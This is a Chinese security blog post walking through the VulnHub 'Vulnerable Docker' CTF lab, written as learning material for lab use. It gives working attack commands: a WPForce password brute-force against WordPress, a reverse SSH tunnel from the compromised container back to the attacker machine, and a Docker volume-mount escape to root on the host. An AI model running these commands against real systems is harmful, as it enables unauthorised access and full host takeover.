> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/rTX_wf_aD0uCoh05DpXfWQ)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **39** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/jU2bISnUvibnZbnibN8FBQH5OCbpy2RiaqvN4CbAVLGxKnXwKvTYKNBgiavibFHfCtibdicicjjPjKXicZASnmAVicxkRlfw/640?wx_fmt=png)

靶机地址：https://www.vulnhub.com/entry/vulnerable-docker-1,208/

靶机难度：中级（CTF）

靶机发布日期：2017 年 9 月 27 日

靶机描述：

是否曾经幻想过在容器中使用 docker 配置错误，权限提升等问题？

下载此虚拟机，拔出笔尖的帽子并开始使用

我们有 2 种模式：-HARD：这将需要您结合使用 docker 技能和笔测试技能来实现主机妥协。- 轻松：相对简单的路径，知道 docker 就足以破坏计算机并在主机上获得根。

我们已在可供您使用的各种机器 / 系统中植入了 3 个标记文件。如果您选择接受，则您的任务如下：

标识所有标志（总共 2 个：flag_1 和 flag_3）（flag_2 被无意中遗漏了）

在主机上获得 id = 0 shell 访问。

目标：得到 root 权限 & 找到 flag.txt

请注意：对于所有这些计算机，我已经使用 VMware 运行下载的计算机。我将使用 Kali Linux 作为解决该 CTF 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/VJt1QibEWNRfO10Oo0PkHSmDL3qXfsGFDH88uPmn8CgjBFdpap6TpyH2RSslx4l1ZLlas24L9zibRj0RMyoXib4QA/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNsCtSSJKOriaAbO9K4vvtlMgNJicg2yTxbCmTJk7oLhAkK6j2cJicpLnDQuWsAibyialgIT2sAP4txbMg/640?wx_fmt=png)  

可以看到靶机开机已经显示了 IP：

```
192.168.56.135
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNsCtSSJKOriaAbO9K4vvtlMUlRsuMAGVtXUoo0W4ABuVTo4pbIOELDn36XI6ssyXMORk2ynxG87pg/640?wx_fmt=png)

nmap 扫到了 22 和 8000 端口都打开了... 可以看到这又是 wordpress CMS

直接访问 http8000..

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNsCtSSJKOriaAbO9K4vvtlMbHq0TiaJaq5UkQ9ruAzdgibpPg2oK7dka07vQLk3U2EFvKtfXCCoS39w/640?wx_fmt=png)

直接上 wpscan...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNsCtSSJKOriaAbO9K4vvtlM5EN7ibvZbEZe4glNicaEQqibtH4jefJiaJcRfziadZZiaFMVAffF78Yyvg5g/640?wx_fmt=png)

这边有挺多信息，有 bob 用户，存在 robot.txt 文件，都查看下吧...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNsCtSSJKOriaAbO9K4vvtlMemvucVoYDYSLaTVyU3e7npydq8ARBribibdrSicFxlI7IbX9ib9iacNFibzQ/640?wx_fmt=png)

```
http://192.168.232.134:8000/wp-admin/
```

是登录入口... 另外一个没啥用...  

这边不用 rockyou.txt 爆破网站，太浪费时间了... 几百万个单词...

这边用 WPForce 爆破...

```
[链接](https://github.com/n00py/WPForce)
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNsCtSSJKOriaAbO9K4vvtlMkN9w7RmyOQ3euwzCd6o52THNpIxcwvCp8Tt28DicnG7afJQsQdMJ1ag/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNsCtSSJKOriaAbO9K4vvtlMgE8qOwqZ3ickoWw371KWnBjmOwP28iaEpxKQ3L3ruwdUEvTIUf8eXvKg/640?wx_fmt=png)

```
python wpforce.py -i dayu.txt -w /root/Desktop/dayu/10_million_password_list_top_10000.txt -u http://192.168.56.135:8000
```

命令直接进行爆破，结果：Welcome1 （不懂得可以去查看下链接）

这边还使用 bp 进行爆破也行，这边填写好代理后，填入 bob 账号，劫持...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNsCtSSJKOriaAbO9K4vvtlMTzsVqlUs2b3LBrkwraSDn7LdBRlrYic1EV14VIr9tqC2YuoCGqh4N9A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNsCtSSJKOriaAbO9K4vvtlMqR3PxFyrnl4Qh1eBYNQU4pia0fo2wTgHOK83bMwLRTAjCTvAewuO4GA/640?wx_fmt=png)

然后发到 intruder，放入字典即可爆破，这边我就不多解释了，知道结果即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNsCtSSJKOriaAbO9K4vvtlMCibGib1LWtCJIHFrxm5GfMFYT63OjShfrL7JSoKScfoZU5V4trvonHsg/640?wx_fmt=png)

成功登录...

二、提权

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNsCtSSJKOriaAbO9K4vvtlM4SWb8oCicQbjtHUiaibrssgsNJ7gsgd06z8oVUZof02SrV7WWc7WMzOuQ/640?wx_fmt=png)

找到 flag1：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNsCtSSJKOriaAbO9K4vvtlMnea861mPBLqmL31mt46ubybx60qWXWcPTH5c2dQwXulyzI3YCng0ibw/640?wx_fmt=png)

进来后就很熟悉了，直接提权吧...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNsCtSSJKOriaAbO9K4vvtlMqhhibGtpickxK3bDWOoYCgdHhdkFLpImtIIAkD3P3rbjicWfx453OSNpw/640?wx_fmt=png)

成功拿到低权后...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNsCtSSJKOriaAbO9K4vvtlMdyoxISaCrCibjzyBIdjMc7DOcibe7dVib9yfY74oE3iaMPO5V3wLglsia6Q/640?wx_fmt=png)

不能 sudo...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNsCtSSJKOriaAbO9K4vvtlMP5E6ooQObwqnSe7KmXeRibgOL78GwEicQWybJIo9icKibt52fzltvyoWBg/640?wx_fmt=png)

这边发现本地网络有点问题... 存在 172.18.0.1~4 都能 ping 通... 查看下 Docker 基础架构看看...

应该是存在 remote API 未授权访问漏洞利用...

这里本来可以用：

```
[reGeorg](https://github.com/sensepost/reGeorg)
```

处理的，但是我不会... 很尴尬... 我这边用别的方法整代理.  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNsCtSSJKOriaAbO9K4vvtlMtkkBViadn2yAibqYpJR0HPfFl3qHZiaq2mPEnIjxOOA3ibpgQOX4ficlScw/640?wx_fmt=png)

我这里写了个 sh...

```
#!/bin/bash
hosts=(
"172.18.0.1"
"172.18.0.2"
"172.18.0.3"
"172.18.0.4"
)
END=65535
```

....... 自己琢磨吧...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNsCtSSJKOriaAbO9K4vvtlMmvhxgnic1rp2Pf4icqpftH74M7mw3tFQe2ic5VIGyjxoWL4ickELeuHRHA/640?wx_fmt=png)

开启本地服务...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNsCtSSJKOriaAbO9K4vvtlMfxrM1ohJ5tEUJIIpnicV1MvwhjvB7KIwkTn4pvQibIhiauasUz3U1ib4cA/640?wx_fmt=png)

执行，发现了 8022 端口... 在. 3 上...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNsCtSSJKOriaAbO9K4vvtlMvmRGexZibxa6bOYqtBmBAK88y6gTIwibHwCbQD7EnIBDGmeXNcn9BYXQ/640?wx_fmt=png)

查看 172.18.0.3:8022 的 URL 发现可以 ssh 登录...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNsCtSSJKOriaAbO9K4vvtlME8fkOxtcJ3Mq3elqWn7YzibNIdlbXk2BbUZqW5teQibW55gm8Xo39gcw/640?wx_fmt=png)

```
openssh.deb是这个文件：http://http.us.debian.org/debian/pool/main/o/openssh/openssh-client_6.7p1-5+deb8u4_amd64.deb
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNsCtSSJKOriaAbO9K4vvtlMh6rVPCb867VnNRHOEle7urUZTnMq0icbsmu2tnVmOicq55k8iam4e2YZQ/640?wx_fmt=png)

```
dpkg -x openssh.deb .; cd usr/bin; chmod +x ssh*; ./ssh-keygen -P '' -f id_rsa -t rsa; cat id_rsa.pub
```

用于登陆 ssh...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNsCtSSJKOriaAbO9K4vvtlMJ7H7J8NJ7X3fYzu7BB7iarZTreKbWUicDRyY0w74uaPKuSHlYF70JD6A/640?wx_fmt=png)

```
chmod 600 ~/.ssh/authorized_keys
service ssh restart
```

将密匙放入本地 ssh 目录中... 然后开启 ssh...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNsCtSSJKOriaAbO9K4vvtlMmmMeF5Xd9W23Dwx0FUBMM56aDiaVyKXpm2NRcskRKWw4nuxJeBxFeMg/640?wx_fmt=png)

```
./ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownhostsFile=/dev/null -v -i id_rsa -R 8022:172.18.0.3:8022 -fN root@192.168.182.149
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNsCtSSJKOriaAbO9K4vvtlM0zqDLNfpSVw11dk8JNvuqYQmTmC81B4GFXicoJ6Cjt88AM5H5I4shzA/640?wx_fmt=png)  

成功开启代理...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNsCtSSJKOriaAbO9K4vvtlMM09Xre3J86KpWyHD82V8L639CtqAHicjZuXvnXtW395RBsiap4KBQPug/640?wx_fmt=png)

本地访问 8022 即可登录...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNsCtSSJKOriaAbO9K4vvtlM0QJYC7HBAl82xpaSjm5s7zqa4OzFUHYrMK8E4gBQKaz0TplkZVvK5g/640?wx_fmt=png)

可以看到 docker，可以利用 remote API 未授权访问...

这边需要用外网... 我这边设置的是桥接的局域网环境，我这边得重新弄下改外网环境...

先更新源... 然后下载 curl...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNsCtSSJKOriaAbO9K4vvtlM5ZiaLMicSJS2ut3sko8zjbpqyS6qohx0XD7dfg43CSjgcjoBswNmic0jw/640?wx_fmt=png)

```
curl -fsSL get.docker.com -o get-docker.sh
sh get-docker.sh
docker ps
```

安装了一个 docker，可以看到安装成功了...

```
参考[链接](https://www.secpulse.com/archives/55928.html)
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNsCtSSJKOriaAbO9K4vvtlMzzibV2Z5xiaicTTZlQw0RrgnnYE7dgzpVAbzFANGuH9ficCPVnxRTqCfDA/640?wx_fmt=png)

```
docker run -it --rm -v /:/vol wordpress /bin/bash
```

使用 volume 挂载主机上的所有文件到一个目录... 成功提权... 查看到了 flag3...

这台靶机可以学到 Docker 利用和 remote API 未授权访问分析和利用... 非常好！！！

由于我们已经成功得到 root 权限和 flag，因此完成了简单靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/eYQPCtdp52LibNkiaf6uEFlNLBXkYNLkGrreELUwooJCbCCre3PNVwyB7MD0We5GB7C1iao7ZNneayc3PxQD0iaAmg/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)